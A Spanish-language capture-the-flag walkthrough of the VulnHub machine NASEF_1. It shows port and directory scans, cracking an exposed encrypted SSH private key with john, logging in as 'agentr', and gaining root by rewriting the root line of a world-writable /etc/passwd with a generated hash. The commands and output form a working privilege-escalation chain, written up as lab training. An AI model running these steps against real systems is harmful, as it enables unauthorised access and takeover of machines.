---
icon: flag
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# NASEF\_1 LOCATING TARGET VulnHub

### Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-13 10:05 CEST
Nmap scan report for 192.168.5.134
Host is up (0.00032s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 8f:ec:55:07:54:78:a4:ee:8e:d7:95:41:62:74:77:8e (RSA)
|   256 7c:67:19:8b:bf:73:b4:7f:82:64:df:d5:7b:ad:34:a4 (ECDSA)
|_  256 a1:e7:61:a1:cc:6b:16:10:1c:71:fa:54:ed:89:fd:4c (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
MAC Address: 00:0C:29:CE:93:AA (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.72 seconds
```

### Gobuster

```shell
gobuster dir -u http://<IP>/ -w <WORDLIST> -x html,php,txt -t 50 -k
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.5.134/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/SecList/Web/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 10918]
/.html                (Status: 403) [Size: 278]
/.html                (Status: 403) [Size: 278]
/server-status        (Status: 403) [Size: 278]
/goodmath.txt         (Status: 200) [Size: 2571]
Progress: 882236 / 882240 (100.00%)
===============================================================
Finished
===============================================================
```

Si nos vamos a ese `.txt` veremos lo siguiente...

```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,6A4D21879E90C5E2F448418E600FE270

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
-----END RSA PRIVATE KEY-----

Here is your key agentr
```

Vemos que es una `id_rsa` por lo que se ve tiene contraseña, por lo que haremos lo siguiente...

```shell
ssh2john id_rsa > sshkey
```

```shell
john --wordlist=<WORDLIST> sshkey
```

Info:

```
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 16 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
reading          (id_rsa)     
1g 0:00:00:00 DONE (2024-07-13 10:15) 2.173g/s 6678p/s 6678c/s 6678C/s kikay..dangerous
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Veremos que la contraseña es `reading` por lo que haremos lo siguiente...

```shell
chmod 600 id_rsa
```

Vemos que en el `.txt` nos dijo un nombre por lo que probaremos con ese nombre `agentr`...

```shell
ssh -i id_rsa agentr@<IP>
```

Metemos la contraseña del `id_rsa` y ya estariamos dentro con el usuario `agentr`...

Leeremos la flag del la `/home`...

> user.txt (flag1)

```
[Arabic]
الإحداثيات الأولى هي 25 درجة شمالا

[English]
The First coordinate is 25.0000° N
```

Si vemos los permisos del siguiente archivo...

```shell
ls -la /etc/passwd
```

Info:

```
-rw-r--rw- 1 root root 1763 Dec 24  2020 /etc/passwd
```

Vemos que podemos escribir, por lo que haremos lo siguiente...

Nos descargaremos la siguiente herramienta creada por mi (@d1se0) en github...

URL = https://github.com/D1se0/passwordGenerator

```shell
python3 passwordGenerator.py -l 3 -e unix_passwd
```

o

```shell
passwordGenerator -l 3 -e unix_passwd
```

Info:

```
 ____                        _  ____                                      
 |  _ \  __ _ ___  ___       | |/ ___|  __ _ _ __ ___   __ _ _ __ _   _ ___ 
 | | | |/ _` / __|/ _ \  _   | | |  _  / _` | '_ ` _ \ / _` | '__| | | / __|
 | |_| | (_| \__ \  __/ | |__| | |_| | (_| | | | | | | (_| | |  | |_| \__ \
 |____/ \__,_|___/\___|  \____/ \____|\__,_|_| |_| |_|\__,_|_|   \__,_|___/
passwordGenerator v1.0
by Diseo (@d1se0) 

Contraseña Generada: v4l

Contraseña codificada (UNIX_PASSWD): $6$rounds=656000$bbwClv8EHMh/evoj$8vAkS.wJphWsDfdteK1sIc8eebShfmUMHhKEQQvmm3N4rEPCC5uzjTVaK2uarnB8/qIQHYtpZ8l/g1ur54VKL1
```

Generara una contraseña aleatoria poniendo el numero de letras que quiere que tenga en mi caso solo 3 para que sea corta y codificarlo en `unix_passwd`, por lo que ese codigo codificado es lo que tenemos que pegar en el `/etc/passwd` de la siguiente manera...

```shell
nano /etc/passwd

#Dntro del nano
root:$6$rounds=656000$bbwClv8EHMh/evoj$8vAkS.wJphWsDfdteK1sIc8eebShfmUMHhKEQQvmm3N4rEPCC5uzjTVaK2uarnB8/qIQHYtpZ8l/g1ur54VKL1:0:0:root:/root:/bin/bash
```

Quedara algo tal que asi, por lo que lo guardamos e intentamos ser `root` poniendo esa contraseña generada en mi caso `v4l`...

```shell
su root
```

Y si metemos la contraseña sin codificar veremos que seremos `root`...

```shell
id
```

Info:

```
uid=0(root) gid=0(root) groups=0(root)
```

Por lo que leeremos la flag...

> root.txt (flag2)

```
[ARABIC]
الإحداثيات الثانية هي 71 درجة غربا


[ENGLISH]
The Second coordinate is 71.0000° W
```
